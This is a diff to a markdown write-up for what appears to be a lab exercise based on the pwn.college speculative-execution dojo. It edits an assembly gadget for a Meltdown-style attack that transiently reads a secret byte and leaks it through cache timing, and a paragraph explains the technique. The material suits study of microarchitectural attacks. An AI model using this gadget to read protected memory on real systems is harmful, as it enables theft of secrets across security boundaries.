@@ -55,13 +55,11 @@ The core gadget in in speculative_exploit.s:
     # instructions. It's only purpose is to be
     # slow and cause the CPU to increase the
     # chance of speculatively execute the
-    # next group of instructions.
-    mov rax, 0x1337
-    push rax
-    fild qword ptr [rsp]
-    fsqrt
-    fistp qword ptr [rsp]
-    pop rax
+    # next dependent chain of instructions.
+    mov rax, rdi
+    .rept 200
+        imul rax, rax
+    .endr
     mov rax, [rax]            # Intentional fault by dereferencing an invalid address
 
     # These instructions will never effectively
@@ -69,14 +67,14 @@ The core gadget in in speculative_exploit.s:
     # as transient instructions while the CPU is
     # waiting for the slow dependent chain of
     # instructions above to complete.
-    mov cl, byte ptr [rdi]    # Read one byte from target address to leak
-    shl rcx, 12               # Makes it a page offset (byte * 0x1000)
-    add rbx, rcx              # Select page in the communication buffer
-    mov rbx, [rbx]            # Touch selected page, encoding the byte into CPU cache state
+    mov cl, byte ptr [rdi]
+    shl rcx, 12
+    add rbx, rcx
+    mov rbx, [rbx]
 ```
 
 During speculative execution, the value loaded from the target address is used as an index into the communication buffer. Because the buffer is laid out as 256 page-sized regions, accessing `comm_buf[byte * 0x1000]` causes exactly one page corresponding to the secret byte to be loaded into the CPU cache. Although the faulting execution is later discarded architecturally, this cache state persists. After handling the fault, the program measures access latency to each page, the page that loads fastest reveals which value was accessed transiently, thereby leaking the secret byte through a microarchitectural side channel.
 
-## References & inspiration
+## Reference & Inspiration
 
 [pwn.college Microarchitecture Exploitation Dojo](https://pwn.college/system-security/speculative-execution/)
